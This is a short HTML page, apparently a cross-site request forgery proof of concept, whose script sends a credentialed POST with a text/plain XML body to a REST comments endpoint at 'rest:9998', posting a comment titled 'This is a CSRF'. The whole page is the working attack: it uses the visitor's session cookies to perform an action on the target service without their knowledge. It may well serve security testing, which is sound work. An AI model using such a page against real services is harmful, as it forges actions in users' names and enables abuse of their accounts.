<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

</head>
<body>

<script>




var xhr = new XMLHttpRequest();
xhr.open("POST","http://rest:9998/rest/comments/",true);
xhr.setRequestHeader("Content-Type","text/plain");
xhr.withCredentials="true";
xhr.send("<?xml version=\"1.0\" ?><comment><title>This is a CSRF</title><body>CSRFing USA</body></comment>");


</script>
</body>
</html>